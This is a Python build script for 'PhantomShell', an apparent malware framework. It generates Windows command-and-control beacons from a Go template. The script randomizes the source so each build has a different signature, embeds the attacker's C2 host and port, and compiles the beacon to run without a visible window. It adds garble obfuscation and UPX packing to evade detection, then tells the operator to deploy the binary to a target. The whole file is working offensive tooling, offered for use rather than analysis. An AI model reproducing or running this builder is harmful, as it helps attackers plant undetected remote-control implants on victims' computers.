#!/usr/bin/env python3
"""
PhantomShell Go Beacon Generator v3
— Randomized source + Garble obfuscation + UPX packing

Usage:
    python generate.py --host 127.0.0.1 --port 4444
    python generate.py --host 10.0.0.1 --port 4444 --output agent.exe
    python generate.py --host 10.0.0.1 --port 4444 --no-garble --no-upx
"""

import os
import re
import sys
import uuid
import shutil
import random
import string
import hashlib
import argparse
import subprocess
import tempfile
from pathlib import Path
from datetime import datetime

# ── Config ──────────────────────────────────────────────────
SCRIPT_DIR  = Path(__file__).parent.resolve()
TEMPLATE    = SCRIPT_DIR / "beacon.go"
OUTPUT_DIR  = SCRIPT_DIR / "output"

GO_CANDIDATES = [
    "go",
]

UPX_CANDIDATES = [
    "upx",
]


def find_tool(candidates: list, name: str) -> Path | None:
    for c in candidates:
        p = Path(c)
        try:
            result = subprocess.run(
                [str(p), "--version" if name == "upx" else "version"],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                return p
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            continue
    return None


# ── Randomization ───────────────────────────────────────────

def rand_ident(prefix: str = "x") -> str:
    """Generate a random Go identifier."""
    chars = string.ascii_letters
    return prefix + "".join(random.choices(chars, k=random.randint(6, 12)))


def rand_hex(n: int = 8) -> str:
    return "".join(random.choices("0123456789ABCDEF", k=n)).upper()


def randomize_template(template: str) -> str:
    """Fill all {{RANDOM_*}} and {{BUILD_MARKER}} placeholders."""
    seed = random.randint(1, 999999)

    replacements = {
        "{{BUILD_MARKER}}":     uuid.uuid4().hex + uuid.uuid4().hex[:16],
        "{{RANDOM_COMMENT_1}}": f"Build: {datetime.now().isoformat()} | Seed: 0x{seed:06X}",
        "{{RANDOM_COMMENT_2}}": f"SHA256({random.randint(100000, 999999)}): {hashlib.sha256(str(seed).encode()).hexdigest()[:16]}",
        "{{RANDOM_IMPORT}}":    f'_{random.randint(1000, 9999)} "{random.choice(["crypto/md5","encoding/base32","hash/fnv","encoding/ascii85","hash/crc32"])}"',
        "{{RANDOM_TYPE_1}}":    rand_ident("T"),
        "{{RANDOM_TYPE_2}}":    rand_ident("T"),
        "{{RANDOM_FUNC_1}}":    rand_ident("f"),
        "{{RANDOM_FUNC_2}}":    rand_ident("f"),
        "{{RANDOM_FUNC_3}}":    rand_ident("f"),
        "{{RANDOM_VAR_1}}":     rand_ident("v"),
        "{{RANDOM_VAR_2}}":     rand_ident("v"),
        "{{RANDOM_ARRAY_SIZE}}": str(random.randint(64, 256)),
        "{{RANDOM_XOR}}":       rand_hex(8),
        "{{RANDOM_LOOP}}":      str(random.randint(2, 10)),
        "{{RANDOM_SEED}}":      str(random.randint(100, 9999)),
        "{{RANDOM_BUF_SIZE}}":  str(random.randint(128, 512)),
    }

    result = template
    for k, v in replacements.items():
        result = result.replace(k, v)

    # Clean up the random import comment — turn "_1234 "import/path""
    # into a valid unused import
    result = re.sub(r'// \w+ "([^"]+)"', r'_ "%s"' % random.choice([
        "crypto/md5", "encoding/base32", "hash/fnv", "encoding/ascii85", "hash/crc32",
    ]), result)

    return result


# ── Build ───────────────────────────────────────────────────

def build(host: str, port: int, output_name: str, use_garble: bool, use_upx: bool):
    go    = find_tool(GO_CANDIDATES, "go")
    upx   = find_tool(UPX_CANDIDATES, "upx") if use_upx else None

    if not go:
        print("[-] Go compiler not found!")
        sys.exit(1)
    print(f"[+] Go  : {go}")

    if use_upx and not upx:
        print("[!] UPX not found — skipping packing")
        use_upx = False
    elif upx:
        print(f"[+] UPX : {upx}")

    # ── Read & randomize template ───────────────────
    if not TEMPLATE.exists():
        print(f"[-] Template not found: {TEMPLATE}")
        sys.exit(1)
    template = TEMPLATE.read_text(encoding="utf-8")
    source = randomize_template(template)
    source = source.replace("{{C2_HOST}}", host)
    source = source.replace("{{C2_PORT}}", str(port))

    build_marker = re.search(r'var buildMarker = "([^"]+)"', source)
    marker_short = build_marker.group(1)[:12] if build_marker else "unknown"
    print(f"[*] Target    : {host}:{port}")
    print(f"[*] Marker    : {marker_short}...")
    print(f"[*] Garble    : {'ON' if use_garble else 'OFF'}")
    print(f"[*] UPX       : {'ON' if use_upx else 'OFF'}")

    # ── Compile ─────────────────────────────────────
    OUTPUT_DIR.mkdir(exist_ok=True)
    output_path = OUTPUT_DIR / output_name

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp     = Path(tmpdir)
        go_file = tmp / "beacon.go"
        go_file.write_text(source, encoding="utf-8")

        # Init Go module
        subprocess.run(
            [str(go), "mod", "init", "beacon"],
            cwd=str(tmp), capture_output=True, timeout=10
        )

        env = os.environ.copy()
        env["GOOS"]        = "windows"
        env["GOARCH"]      = "amd64"
        env["CGO_ENABLED"]  = "0"

        print(f"\n[*] Compiling...")
        print(f"    GOOS={env['GOOS']} GOARCH={env['GOARCH']} CGO_ENABLED={env['CGO_ENABLED']}")

        if use_garble:
            # Use garble for obfuscation
            # garble flags: -tiny (extra stripping), -seed=random (deterministic per seed)
            garble_seed = str(random.randint(0, 999999999))
            build_cmd = [
                str(go), "run", "mvdan.cc/garble@latest",
                "-tiny",
                "-seed", garble_seed,
                "build",
                "-ldflags", "-s -w -H windowsgui",
                "-o", str(tmp / "beacon.exe"),
                str(go_file),
            ]
            print(f"    GARBLE: tiny mode, seed={garble_seed}")
        else:
            build_cmd = [
                str(go), "build",
                "-ldflags", "-s -w -H windowsgui",
                "-trimpath",
                "-o", str(tmp / "beacon.exe"),
                str(go_file),
            ]

        result = subprocess.run(
            build_cmd,
            cwd=str(tmp), env=env,
            capture_output=True, text=True, timeout=120
        )

        if result.returncode != 0:
            print(f"[-] Build FAILED:")
            stderr = result.stderr
            # Truncate garble output
            if len(stderr) > 2000:
                stderr = stderr[-2000:]
            print(stderr)
            sys.exit(1)

        built = tmp / "beacon.exe"
        if not built.exists():
            print("[-] Build produced no output file")
            sys.exit(1)

        size_raw = built.stat().st_size / 1024
        print(f"    Raw size: {size_raw:.1f} KB")

        # ── UPX packing ───────────────────────────────
        final = str(built)
        if use_upx and upx:
            print(f"[*] Packing with UPX...")
            upx_result = subprocess.run(
                [str(upx), "--best", "--lzma", "-q", str(built)],
                capture_output=True, text=True, timeout=30
            )
            if upx_result.returncode == 0:
                size_upx = built.stat().st_size / 1024
                print(f"    UPX size: {size_upx:.1f} KB ({size_upx/size_raw*100:.0f}%)")
            else:
                print(f"[!] UPX failed, using raw binary")

        shutil.copy2(built, output_path)

    # ── Report ───────────────────────────────────────
    final_size = output_path.stat().st_size / 1024
    sha = hashlib.sha256(output_path.read_bytes()).hexdigest()[:16]

    print(f"\n{'='*60}")
    print(f"[+] BUILD SUCCESS")
    print(f"    File : {output_path}")
    print(f"    Size : {final_size:.1f} KB")
    print(f"    SHA256: {sha}")
    print(f"    C2   : {host}:{port}")
    print(f"    Marker: {marker_short}...")
    if use_garble:
        print(f"    Obf  : garble (tiny)")
    if use_upx:
        print(f"    Pack : UPX (LZMA best)")
    print(f"\n[*] Deploy to target, then start C2:")
    print(f"    python phantomc2.py --port {port} --web-port 8080 --password phantomshell\n")


def main():
    p = argparse.ArgumentParser(description="PhantomShell Go Beacon Generator v3")
    p.add_argument("--host",      required=True,        help="C2 server IP")
    p.add_argument("--port",      required=True, type=int, help="C2 server port")
    p.add_argument("--output",    default="beacon.exe", help="Output filename")
    p.add_argument("--no-garble", action="store_true",  help="Disable garble obfuscation")
    p.add_argument("--no-upx",    action="store_true",  help="Disable UPX packing")
    args = p.parse_args()

    build(args.host, args.port, args.output,
          use_garble=not args.no_garble,
          use_upx=not args.no_upx)


if __name__ == "__main__":
    main()
